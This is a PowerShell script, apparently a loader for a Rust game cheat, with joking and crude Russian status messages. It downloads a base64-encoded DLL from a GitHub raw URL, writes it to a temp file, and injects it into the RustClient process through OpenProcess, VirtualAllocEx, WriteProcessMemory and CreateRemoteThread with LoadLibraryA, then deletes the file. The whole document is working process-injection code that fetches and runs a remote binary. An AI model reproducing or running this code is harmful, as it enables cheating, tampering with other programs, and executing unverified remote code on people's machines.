$Url = "https://raw.githubusercontent.com/PUZAN1337/-/refs/heads/main/svin.dll"
$TargetProcessName = "RustClient"

$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "пава администлатола нузны бразан" -ForegroundColor Red
}

$Win32Code = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);

    public const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
    public const uint MEM_COMMIT = 0x1000;
    public const uint MEM_RESERVE = 0x2000;
    public const uint MEM_RELEASE = 0x8000;
    public const uint PAGE_READWRITE = 0x04;
}
"@

if (-not ([System.Management.Automation.PSTypeName]'Win32').Type) {
    Add-Type -TypeDefinition $Win32Code -ErrorAction Stop
}

try {
    $base64String = Invoke-RestMethod -Uri $Url -UseBasicParsing -ErrorAction Stop
} catch {
    Write-Error "интярнет канекшн: $($_.Exception.Message)"
    return
}
$base64String = ($base64String -replace '\s', '')
Write-Host "[+] Подсчет батьков - $($base64String.Length) " -ForegroundColor Green

try {
    $dllBytes = [System.Convert]::FromBase64String($base64String)
} catch {
    Write-Error "Не удалось вдекодить басе шесть чятыре: $($_.Exception.Message)"
    return
}
Write-Host "[+] ширина анального отверстия в см: $($dllBytes.Length) скибиди поезд" -ForegroundColor Green

if ($dllBytes[0] -ne 0x4D -or $dllBytes[1] -ne 0x5A) {
    Write-Warning "мамы нету папы нету ниче святого нету"
}

$targetProcess = Get-Process -Name $TargetProcessName -ErrorAction SilentlyContinue | Select-Object -First 1

if (-not $targetProcess) {
    Write-Host "[!] Процесс не найден" -ForegroundColor Yellow
    Get-Process | Where-Object { $_.ProcessName -like '*rust*' } |
        Format-Table Id, ProcessName, Path -AutoSize
    return
}

$tempDll = Join-Path $env:TEMP ("svin_{0}.dll" -f ([Guid]::NewGuid().ToString('N')))
[System.IO.File]::WriteAllBytes($tempDll, $dllBytes)

$hProcess = [IntPtr]::Zero
try {
    $hProcess = [Win32]::OpenProcess([Win32]::PROCESS_ALL_ACCESS, $false, $targetProcess.Id)
    if ($hProcess -eq [IntPtr]::Zero) {
        $err = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
        throw "OpenProcess вернул NULL. Win32 error: $err ($([ComponentModel.Win32Exception]::new($err).Message))"
    }

    $pathBytes = [System.Text.Encoding]::ASCII.GetBytes($tempDll + [char]0)

    $remoteMem = [Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, [uint32]$pathBytes.Length, ([Win32]::MEM_COMMIT -bor [Win32]::MEM_RESERVE), [Win32]::PAGE_READWRITE)
    if ($remoteMem -eq [IntPtr]::Zero) {
        $err = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
        throw "VirtualAllocEx вернул NULL. Win32 error: $err ($([ComponentModel.Win32Exception]::new($err).Message))"
    }

    $written = [UIntPtr]::Zero
    $ok = [Win32]::WriteProcessMemory($hProcess, $remoteMem, $pathBytes, [uint32]$pathBytes.Length, [ref]$written)
    if (-not $ok) {
        $err = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
        throw "WriteProcessMemory failed. Win32 error: $err ($([ComponentModel.Win32Exception]::new($err).Message))"
    }

    $kernel32 = [Win32]::GetModuleHandle("kernel32.dll")
    $loadLibAddr = [Win32]::GetProcAddress($kernel32, "LoadLibraryA")
    if ($loadLibAddr -eq [IntPtr]::Zero) {
        throw "LoadLibraryA"
    }

    $hThread = [Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $loadLibAddr, $remoteMem, 0, [IntPtr]::Zero)
    if ($hThread -eq [IntPtr]::Zero) {
        $err = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
        throw "CreateRemoteThread. Win32 error: $err ($([ComponentModel.Win32Exception]::new($err).Message))"
    }

    Write-Host "[*] пивет" -ForegroundColor Cyan
    [Win32]::CloseHandle($hThread) | Out-Null

    # ИСПРАВЛЕНО ТУТ (убрана лишняя кавычка)
    Write-Host "[+] голда хак" -ForegroundColor Green
}
catch {
    Write-Error "аче бате $($_.Exception.Message)"
}
finally {
    if ($hProcess -ne [IntPtr]::Zero) {
        [Win32]::CloseHandle($hProcess) | Out-Null
    }
    Start-Sleep -Milliseconds 500
    Remove-Item $tempDll -Force -ErrorAction SilentlyContinue
    # ИСПРАВЛЕНО ТУТ (убрана лишняя кавычка)
    Write-Host "[*] голда" -ForegroundColor Cyan
}
